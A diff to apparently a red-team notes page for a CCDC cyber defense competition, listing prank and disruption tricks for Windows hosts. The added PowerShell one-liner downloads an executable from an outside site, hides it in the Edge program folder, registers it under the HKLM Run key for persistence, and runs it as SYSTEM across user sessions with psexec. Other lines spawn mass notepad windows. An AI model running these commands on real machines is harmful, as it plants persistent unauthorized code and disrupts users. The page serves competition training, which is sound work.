@@ -263,9 +263,10 @@ pagetitle: Red Teaming for CCDC
 - Set all computers to same background:
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
 - Make mouse shake: [cold_hands.exe](https://khaelkugler.com/misc_scripts/cold_hands.exe)
-  - `iwr https://khaelkugler.com/misc_scripts/cold_hands.exe -o "C:\Program Files (x86)\Microsoft\Edge\Application\Edge.exe"`
-  - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeAutoLaunch" -Value "C:\Program Files (x86)\Microsoft\Edge\Application\Edge.exe"`
-- In another user's session with `psexec.exe -i {session_id} -s powershell.exe -Command "{command}" -accept-eula`
+  - Script to make it happen and add to HKLM -> Run
+  - `iwr https://khaelkugler.com/misc_scripts/cold_hands.exe -o "C:\Program Files (x86)\Microsoft\Edge\Application\cold_hands.exe"; Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "ChillyFingers" -Value "C:\Program Files (x86)\Microsoft\Edge\Application\cold_hands.exe"; iwr https://download.sysinternals.com/files/PSTools.zip -o "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip"; Expand-Archive "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip" -d "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\"; 1..5 | ForEach-Object { & "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\psexec.exe" -i $_ -d -s "C:\Program Files (x86)\Microsoft\Edge\Application\cold_hands.exe" -accepteula }`
+- In another user's session with `.\psexec -i {session} -d -s powershell -command '{command}' -accepteula`
+  - `-d` exits immediately 
 - Spawn 50 notepads:
   - `1..50 | ForEach-Object {Start-Process notepad}`
 - Spawn message box on Windows:
